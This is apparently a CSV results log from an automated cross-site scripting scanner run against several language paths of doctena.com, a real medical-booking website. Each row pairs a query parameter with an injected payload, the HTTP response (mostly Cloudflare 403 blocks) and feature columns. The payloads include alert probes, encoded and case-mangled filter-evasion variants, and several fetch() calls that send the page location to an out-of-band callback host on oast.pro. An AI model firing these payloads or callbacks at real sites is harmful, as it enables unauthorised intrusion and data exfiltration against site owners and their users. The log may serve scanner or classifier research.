url,param,payload,server_type,method,response_code,response_time,response_pattern,success,content_snippet,vulnerable,injection_context,nlp_forms_found,nlp_inputs_count,nlp_scripts_found,nlp_has_eval_or_write,nlp_has_sanitization_patterns,nlp_reflected_location_type,fuzz_num_filtered,fuzz_num_encoded
https://www.doctena.com/fr-be/,search_limit_to_post_titles,%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E,generic,GET,403,2.191476345062256,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,post_type[],"<A hreF=""javAScRIPt:COnfIRM('xsS')"">CliCK Me</A>",generic,GET,403,2.1090753078460693,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-lu/,live_search_display_featured_image,&#34><IMG sRc=x ONerrOR=ALeRt('xsS')>,generic,GET,403,2.083456516265869,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-be/,live_search_display_post_type,"javascripT:eVaL(""ALert('xsS')"")",generic,GET,403,2.067025899887085,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-be/,add_woo_product_skus,<scri pt>fetch('//65rpavzptmnd.oast.pro/script?loc='+btoa(window.location))</script>,generic,GET,403,2.0923144817352295,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-lu/,live_search_display_post_type,"&#x3c;a foo=a src=""javascript:alert('XSS')""&#x3e;Click Me&#x3c;/a&#x3e;",generic,GET,403,2.067957639694214,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-be/,fs,"""><a href=""javascript:al	ert(1)('XSS')"">Click Me</a>",generic,GET,403,2.1511032581329346,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-be/,fs,"<iMG foo=A SRC=""jAVaScRipt:AlErT('XsS')"">",generic,GET,403,2.0823371410369873,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,search_limit_to_post_titles,&#x3c;img&#x3e;,generic,GET,200,3.859586238861084,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,generic,1,7,1,0,0,none,0,0
https://www.doctena.com/de/,s,"<A hREf=""jAVasCRipT:eVal('aleRt(\'XSs\')')"">ClICK Me</a>",generic,GET,403,2.074187994003296,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,add_woo_product_skus,%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E,generic,GET,403,2.082245111465454,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-lu/,fs,"&#x3c;img src=""http://example.com/image.jpg""&#x3e;",generic,GET,200,3.170746088027954,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,generic,1,7,1,0,0,none,0,0
https://www.doctena.com/de/,post_type[],"<IMg onmOuSeOvEr=""aLeRt('XsS')"" SrC=""x"">",generic,GET,403,2.076152801513672,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,live_min_character,%3CTABLE%3E%3CTD%20BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,generic,GET,403,2.051868200302124,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de/,search_limit_to_post_titles,<s<Sc<script>ript>alert('XSS')</script>,generic,GET,403,2.0696330070495605,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,s,"&#x3c;img src=""""&#x3e;",generic,GET,200,4.772969722747803,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,generic,1,7,1,0,0,none,0,0
https://www.doctena.com/de/,add_woo_product_skus,<script>al	ert(1)(1)</script>,generic,GET,403,2.081389904022217,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-lu/,s,"<?xML VErSION=""1.0"" EnCoDING=""isO-8859-1""?><foo><![cDaTa[<]]>SCRipT<![cdaTa[>]]>Alert('Xss')<![CdaTA[<]]>/ScRiPT<![CdATa[>]]></foo>",generic,GET,200,4.881954669952393,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,attribute,1,7,1,0,0,attribute,0,0
https://www.doctena.com/de-at/,post_type[],"<TD BACKGROUND=""javascript:al	ert(1)('XSS')"">",generic,GET,403,2.0844435691833496,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,live_posts_per_page,<IMg>,generic,GET,200,3.1673295497894287,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,generic,1,7,1,0,0,none,0,0
https://www.doctena.com/de/,live_min_character,"<img SRc=X OnerROr=evAl(sTriNg.FromChARCodE(97,108,101,114,116,40,49,41))>",generic,GET,403,2.088284969329834,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-lu/,post_type[],"&#x3c;input type=""text"" value=""&#x3c;img src=x onerror=alert('XSS')&#x3e;"" /&#x3e;",generic,GET,403,2.0928571224212646,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,search_limit_to_post_titles,"<Img onmOUSEovER=""aleRt('xss')"" SrC=""x"">",generic,GET,403,2.0995445251464844,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de/,live_posts_per_page,%3Ca%20href%3D%22javascript%3Aeval%28%27alert%28%5C%27XSS%5C%27%29%27%29%22%3EClick%20Me%3C/a%3E,generic,GET,403,2.0799121856689453,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,live_search_display_featured_image,"JavaSCRipt:ConFIRm(""xSS"")",generic,GET,403,2.062217950820923,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-lu/,search_limit_to_post_titles,"<swF><paRaM NAMe=MoViE VAlUe=""javaScrIpt:ALErt('XsS')""></paRAm><EmbeD Src=""JAVasCRIPt:aLERt('XSS')""></embed></sWf>",generic,GET,403,2.073654890060425,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,add_woo_product_skus,<SvG/oNloAD=FEtch('//65rpAvZPtMNd.oasT.pRO/SvG?LoC='+BToa(wINDoW.loCAtion))>,generic,GET,403,2.0698068141937256,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de/,live_search_display_featured_image,"&#x3c;style&#x3e;li {list-style-image: url(""javascript:alert('XSS')"");}&#x3c;/style&#x3e;&#x3c;ul&#x3e;&#x3c;li&#x3e;&#x3c;/ul&#x3e;",generic,GET,403,2.074951648712158,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,live_search_display_post_type,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>",generic,GET,403,2.069551706314087,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-lu/,add_woo_product_skus,%3Csvg%3E%3Cp%3E%3Cstyle%3E%3Cimg%20src%3D1%20href%3D1%20onerror%3Dalert%281%29%3E%3C/p%3E%3C/svg%3E,generic,GET,403,2.064988374710083,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,live_min_character,<svg><p><style><img src=1 href=1 on/**/error=alert(1)></p></svg>,generic,GET,403,2.1064629554748535,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,generic,0,0,1,1,0,none,0,0
https://www.doctena.com/de/,live_search_display_post_type,"&#x3c;a href=""javascript:eval('alert(\'XSS\')')""&#x3e;Click Me&#x3c;/a&#x3e;",generic,GET,403,2.0760769844055176,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,fs,<scri pt>fetch('//65rpavzptmnd.oast.pro/script?loc='+btoa(window.location))</script>,generic,GET,403,2.0456862449645996,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-lu/,fs,"&#x3c;img src=""x"" onerror=""alert('XSS')"" /&#x3e;",generic,GET,403,2.0751724243164062,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,live_posts_per_page,%3CTD%20BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,generic,GET,403,2.055265188217163,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de/,fs,"<a href=""javascript:al	ert(1)('XSS')"">Click Me</a>",generic,GET,403,2.069427728652954,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,live_search_display_featured_image,"<img src=x onerror=al	ert(1)(""XSS"")>",generic,GET,403,2.0687129497528076,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-be/,s,&#x22><img src=x onerror=alert('XSS')>,generic,GET,403,2.07062029838562,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-lu/,s,%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E,generic,GET,403,2.0755155086517334,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,live_search_display_post_type,"<img src=""x"" onerror=""alert('XSS')"" />",generic,GET,403,2.082653045654297,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-ch/,s,"&#x3c;img src=""http://example.com/image.jpg""&#x3e;",generic,GET,200,5.03466796875,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,generic,1,7,1,0,0,none,0,0
https://www.doctena.com/en-be/,post_type[],"<input type=""text"" value=""<img src=x onerror=al	ert(1)('XSS')>"" />",generic,GET,403,2.0879886150360107,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-lu/,post_type[],"<TD BACKGROUND=""javascript:al	ert(1)('XSS')"">",generic,GET,403,2.0687026977539062,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,fs,%3Csvg/onload%3Dfetch%28%27//65rpavzptmnd.oast.pro/svg%3Floc%3D%27%2Bbtoa%28window.location%29%29%3E,generic,GET,403,2.093252658843994,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-ch/,post_type[],"&#x3c;?xml version=""1.0"" encoding=""ISO-8859-1""?&#x3e;&#x3c;foo&#x3e;&#x3c;![CDATA[&#x3c;]]&#x3e;SCRIPT&#x3c;![CDATA[&#x3e;]]&#x3e;alert('XSS')&#x3c;![CDATA[&#x3c;]]&#x3e;/SCRIPT&#x3c;![CDATA[&#x3e;]]&#x3e;&#x3c;/foo&#x3e;",generic,GET,403,2.0667200088500977,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-be/,search_limit_to_post_titles,%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%22XSS%22%29%3E,generic,GET,403,2.0708773136138916,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-lu/,search_limit_to_post_titles,"<iMg SRc=x ONerRoR=AlERT(""xSs"")>",generic,GET,403,2.060298442840576,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-ch/,search_limit_to_post_titles,"<ImG SRC=x oNeRroR=CoNfIRm(""Xss"")>",generic,GET,403,2.071937322616577,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-be/,add_woo_product_skus,&#34><img src=x onerror=al	ert(1)('XSS')>,generic,GET,403,2.0708398818969727,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl/,s,&#34><img src=x onerror=alert('XSS')>,generic,GET,403,2.066138505935669,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-lu/,add_woo_product_skus,"<iFrame SRc=""JAvAScrIpt:alert('xSs')""></IfrAME>",generic,GET,403,2.076259136199951,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-ch/,add_woo_product_skus,"'; al	ert(1)(String.fromCharCode(88,83,83))//'; al	ert(1)(String.fromCharCode(88,83,83))//""; al	ert(1)(String.fromCharCode(88,83,83))//""; al	ert(1)(String.fromCharCode(88,83,83))//--></SCRIPT>"">'; al	ert(1)(String.fromCharCode(88,83,83))//'; al	ert(1)(String.fromCharCode(88,83,83))//""; al	ert(1)(String.fromCharCode(88,83,83))//""; al	ert(1)(String.fromCharCode(88,83,83))//--></SCRIPT>",generic,GET,403,2.049971342086792,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl/,post_type[],&#34><img src=x onerror=al	ert(1)('XSS')>,generic,GET,403,2.0684754848480225,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-lu/,live_min_character,&#x3c;img src=x onerror=fetch('//65rpavzptmnd.oast.pro/img?loc='+btoa(window.location))&#x3e;,generic,GET,403,2.066277027130127,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-ch/,live_min_character,"'; alert(String.fromCharCode(88,83,83))//'; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//--&#x3e;&#x3c;/SCRIPT&#x3e;""&#x3e;'; alert(String.fromCharCode(88,83,83))//'; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//--&#x3e;&#x3c;/SCRIPT&#x3e;",generic,GET,403,2.105989933013916,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl/,search_limit_to_post_titles,"<img src=x onerror=al	ert(1)(""XSS"")>",generic,GET,403,2.056668758392334,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-lu/,live_posts_per_page,"<a foO=a SRC=""jAVasCRIPt:aLerT('xSS')"">cLICK mE</A>",generic,GET,403,2.0730199813842773,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-be/,live_min_character,%3Cimg%20src%3D%22%22%3E,generic,GET,200,4.430291175842285,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,generic,1,7,1,0,0,none,0,0
https://www.doctena.com/en-ch/,live_posts_per_page,"""><script>alert(""XSS"")</script>",generic,GET,403,2.051084280014038,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl/,add_woo_product_skus,"""&#x3e;&#x3c;img src=x onerror=alert(""XSS"")&#x3e;",generic,GET,403,2.078727960586548,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-lu/,live_search_display_featured_image,"""><img src=x onerror=alert(""XSS"")>",generic,GET,403,2.1101033687591553,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-be/,live_posts_per_page,JAvascrIPt:fETCH('//65RPAVZPTMnD.oasT.PrO/js?loc='+bToA(WiNdoW.loCAtion)),generic,GET,403,2.1400911808013916,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
